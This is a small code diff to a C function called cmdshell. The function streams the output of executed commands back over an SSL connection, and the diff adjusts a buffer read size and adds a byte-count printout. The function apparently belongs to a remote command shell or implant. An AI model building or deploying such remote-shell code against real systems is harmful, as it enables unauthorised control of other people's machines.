@@ -90,8 +90,9 @@ int cmdshell(SSL *ssl) {
       continue;
     }
 
-    while(fgets((char *)buf, sizeof(buf)-1, fp) != NULL) {
+    while(fgets((char *)buf, sizeof(buf), fp) != NULL) {
       ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
+      printf("[*] We have sent a total of %ld bytes\n", total_sent);
       memset(buf, 0, sizeof(buf));
     }
     ssl_writeall(ssl, (uint8_t *)"", 1, &total_sent);
